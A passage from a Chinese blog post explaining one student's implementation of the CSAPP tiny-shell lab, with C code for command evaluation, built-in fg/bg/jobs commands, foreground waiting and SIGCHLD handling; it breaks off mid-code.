<span class="token operator">*</span>cmdline<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">sigquit_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">clearjob</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>job<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">initjobs</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">maxjid</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">addjob</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">,</span> pid_t pid<span class="token punctuation">,</span> <span class="token keyword">int</span> state<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">deletejob</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">,</span> pid_t pid<span class="token punctuation">)</span><span class="token punctuation">;</span> pid_t <span class="token function">fgpid</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span><span class="token function">getjobpid</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">,</span> pid_t pid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span><span class="token function">getjobjid</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">,</span> <span class="token keyword">int</span> jid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">listjobs</span><span class="token punctuation">(</span><span class="token keyword">struct</span> job_t <span class="token operator">*</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">app_error</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token function">handler_t</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>handler_t <span class="token operator">*</span><span class="token function">Signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> handler_t <span class="token operator">*</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*Some function defined by myself*/</span>pid_t <span class="token function">Fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//即CSAPP上提到的错误处理封装函数,不过用起来并不是很顺手</span></code></pre><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>调用parseline函数解析命令行得到argv参数列表,获得前台或后台运行的标志state.<br>调用builtin_cmd检测是否是内置命令,若是则在其中处理,否则返回eval函数fork出子进程,子进程execve方式启动新程序,父进程将job通过addjob加入全局jobs列表,若为前台运行则调用waitfg等待前台程序结束.</p><p>需要注意的问题有两个.<br>第一个:</p><blockquote><p>When you run your shell from the standard Unix shell, your shell is running in the foreground processgroup.  If your shell then creates a child process, by defaultthat child will also be a member of theforeground process group. Since typingctrl-csends a SIGINT to every process in the foregroundgroup, typingctrl-cwill send a SIGINT to your shell, as well as to every process that your shellcreated, which obviously isn’t correct.Here  is  the  workaround:   After  thefork,  but  before  theexecve,  the  child  process  should  callsetpgid(0, 0), which puts the child in a new process group whose group ID is identical to thechild’s PID. This ensures that there will be only one process,  your shell, in the foreground processgroup.   When you typectrl-c, the shell should catch the resulting  SIGINT and then forward itto the appropriate foreground job (or more precisely, the process group that contains the foregroundjob).</p></blockquote><p>因为我们的shell(tsh)是运行在Unix shell之上的,所以当kernel发出一个SIGINT之类的信号,Unix shell会将信号同时发送给tsh以及所有tsh创建的进程(因为tsh是当前shell的前台进程,shell的默认行为会将SIGINT信号发送给整个<code>前台进程组</code>),而我们想要实现的只是将信号发送给tsh的前台进程组.所以在fork子进程后,需要setpgid使得子进程的进程组与父进程独立.</p><blockquote><p>int setpgid(pid_t pid, pid_t pgid);<br>该函数可以用于将一个进程加入到指定的进程组中，或者创建一个新的进程组。具体的行为取决于 pid 参数的取值：<br>    1. 如果 pid 参数为 0，则表示将调用进程加入到与调用进程的PID相同的进程组中。<br>    2. 如果 pgid 参数为 0，则表示将 pid 指定的进程的进程组ID设置为其自身的PID。<br>    3. 如果 pgid 参数不为 0，则表示将 pid 指定的进程的进程组ID设置为 pgid。<br>    setpgid 函数的返回值为 0 表示成功，返回值为 -1 表示出现错误，此时可以通过查看 errno 变量来获取具体的错误信息。</p></blockquote><p>第二个:</p><blockquote><p>In eval, the parent must usesigprocmaskto block SIGCHLD signals before it forks the child,and then unblock these signals, again usingsigprocmaskafter it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sureto then unblock SIGCHLD signals before it execs the new program.6<br>    The parent needs to block theSIGCHLDsignals in this way in order to avoid the race condition wherethe child is reaped by sigchld handler(and thus removed from the job list) before the parent calls addjob.</p></blockquote><p>由于进程间执行顺序是不确定的,子进程在被fork之后在最极端的情况下可以一直执行到结束而父进程还刚从fork函数返回.也就是说,父进程一旦fork子进程,随时可能收到SIGCHLD信号(子进程随时可能暂停或终止).设想一下在父进程fork子进程后,addjob之前,子进程结束发出SIGCHLD信号,父进程捕获信号并在信号处理程序中deletejob删除一个不存在的job,这可能引发错误或被deletejob无视(取决于deletejob的实现),父进程从信号处理函数返回后再调用addjob则会将一个已经终止的进程加入任务列表中.这显然是错误的.所以需要在fork函数之前阻塞SIGCHLD信号,addjob后恢复.需要注意的是子进程会继承父进程的阻塞状态,所以需要在execve之前恢复阻塞.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * eval - Evaluate the command line that the user has just typed in *  * If the user has requested a built-in command (quit, jobs, bg or fg) * then execute it immediately. Otherwise, fork a child process and * run the job in the context of the child. If the job is running in * the foreground, wait for it to terminate and then return.  Note: * each child process must have a unique process group ID so that our//  * background children don't receive SIGINT (SIGTSTP) from the kernel * when we type ctrl-c (ctrl-z) at the keyboard.  */</span><span class="token keyword">void</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmdline<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span>MAXARGS<span class="token punctuation">]</span><span class="token punctuation">;</span>    pid_t pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> state<span class="token punctuation">;</span>    sigset_t mask<span class="token punctuation">,</span>prev<span class="token punctuation">;</span>    <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigaddset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">,</span>SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseline</span><span class="token punctuation">(</span>cmdline<span class="token punctuation">,</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span>        state <span class="token operator">=</span> BG<span class="token punctuation">;</span>    <span class="token keyword">else</span>        state <span class="token operator">=</span> FG<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">builtin_cmd</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span><span class="token operator">&amp;</span>mask<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">Fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">setpgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"setpgid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">execve</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>argv<span class="token punctuation">,</span>environ<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"%s: command not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">addjob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">,</span>state<span class="token punctuation">,</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>state<span class="token operator">==</span>FG<span class="token punctuation">)</span>            <span class="token function">waitfg</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span><span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span>pid<span class="token punctuation">,</span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">builtin_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"quit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"fg"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"bg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">do_bgfg</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"jobs"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">listjobs</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/* not a builtin command */</span><span class="token punctuation">}</span></code></pre><h3 id="dofgbg"><a href="#dofgbg" class="headerlink" title="dofgbg"></a>dofgbg</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * do_bgfg - Execute the builtin bg and fg commands */</span><span class="token keyword">void</span> <span class="token function">do_bgfg</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    pid_t pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> jid<span class="token punctuation">;</span>    <span class="token keyword">struct</span> job_t<span class="token operator">*</span> job<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s command requires PID or %%jobid argument\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'%'</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>jid <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: argument must be a PID or %%jobid\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>job <span class="token operator">=</span> <span class="token function">getjobjid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>jid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%%d: No such job\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: argument must be a PID or %%jobid\n"</span><span class="token punctuation">,</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%%%d: No such process\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"bg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        job<span class="token operator">-</span><span class="token operator">></span>state <span class="token operator">=</span> BG<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">,</span>SIGCONT<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>jid<span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"fg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        job<span class="token operator">-</span><span class="token operator">></span>state <span class="token operator">=</span> FG<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">,</span>SIGCONT<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>jid<span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">,</span> job<span class="token operator">-</span><span class="token operator">></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"do_bgfg: Internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>我使用了和write up上不同的处理,具体见注释.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * waitfg - Block until process pid is no longer the foreground process */</span><span class="token keyword">void</span> <span class="token function">waitfg</span><span class="token punctuation">(</span>pid_t pid<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> job_t<span class="token operator">*</span> job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据write up上的描述,waitfg使用 use a busy loop around thesleepfunction.的方式实现</span>    <span class="token comment" spellcheck="true">// while(1)</span>    <span class="token comment" spellcheck="true">// {</span>    <span class="token comment" spellcheck="true">//     if(job->state==FG)</span>    <span class="token comment" spellcheck="true">//         sleep(1);</span>    <span class="token comment" spellcheck="true">//     else</span>    <span class="token comment" spellcheck="true">//         break;</span>    <span class="token comment" spellcheck="true">// }</span>    <span class="token comment" spellcheck="true">//但CSAPP书上提到这种方法执行太慢,故采用sigsuspend函数</span>    sigset_t mask<span class="token punctuation">,</span>prev<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取当前set存入prev</span>    <span class="token function">sigemptyset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_BLOCK<span class="token punctuation">,</span><span class="token operator">&amp;</span>mask<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>job<span class="token operator">-</span><span class="token operator">></span>state<span class="token operator">==</span>FG<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">sigsuspend</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>prev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sigprocmask</span><span class="token punctuation">(</span>SIG_SETMASK<span class="token punctuation">,</span><span class="token operator">&amp;</span>prev<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>注意Linux的显式信号阻塞可能丢弃掉一部分SIGCHLD信号,所以在sigchld_handler函数的一次调用中需要尽可能多的回收子进程.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*  * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever *     a child job terminates (becomes a zombie), or stops because it *     received a SIGSTOP or SIGTSTP signal. The handler reaps all *     available zombie children, but doesn't wait for any other *     currently running children to terminate.   */</span><span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> <span class="token punctuation">{</span>    pid_t pid<span class="token punctuation">;</span>    <span class="token keyword">int</span> jid<span class="token punctuation">;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    <span class="token keyword">struct</span> job_t<span class="token operator">*</span> job<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"sigchld_handler: entering"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>status<span class="token punctuation">,</span>WNOHANG<span class="token operator">|</span>WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>job <span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token string">"Lost track of (%d)\n"</span><span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        jid <span class="token operator">=</span> job<span class="token operator">-</span><span class="token operator">></span>jid<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) stopped by signal %d\n"</span><span class="token punctuation">,</span>jid<span class="token punctuation">,</span>job<span class="token operator">-</span><span class="token operator">></span>pid<span class="token punctuation">,</span><span class="token function">WSTOPSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            job<span class="token operator">-</span><span class="token operator">></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sigchld_handler: Job [%d] (%d) deleted\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WEXITSTATUS</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>verbose<span class="token punctuation">)</span>                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sigchld_handler: Job [%d] (%d) deleted\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> 